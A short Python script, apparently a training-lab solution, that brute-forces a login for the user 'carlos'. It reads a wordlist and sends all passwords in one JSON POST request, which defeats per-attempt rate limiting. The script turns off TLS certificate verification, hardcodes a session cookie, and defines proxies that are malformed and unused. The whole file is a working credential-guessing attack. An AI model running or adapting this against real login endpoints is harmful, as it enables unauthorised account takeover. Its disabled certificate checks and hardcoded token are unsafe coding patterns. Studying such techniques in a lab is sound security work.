import json;import sys;import urllib;import urllib3;import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
cookies = {'session': "Wc4gPuLlTi0AfpLbSD01yJYJ0Z9GCofw"}
proxies = {'http': "127.0.0.1", 'https': "127.0.0.1"}

def main():
    url = sys.argv[1]
    target_username = "carlos"
    passwords_file = open("passwords", 'r')
    passwords = passwords_file.read().split('\n')
    passwords_file.close()
    creds = {'username': target_username, 'password': passwords}
    response = requests.post(url, verify=False, json=creds)
    print(response.status_code)

if __name__ == "__main__":
    main()
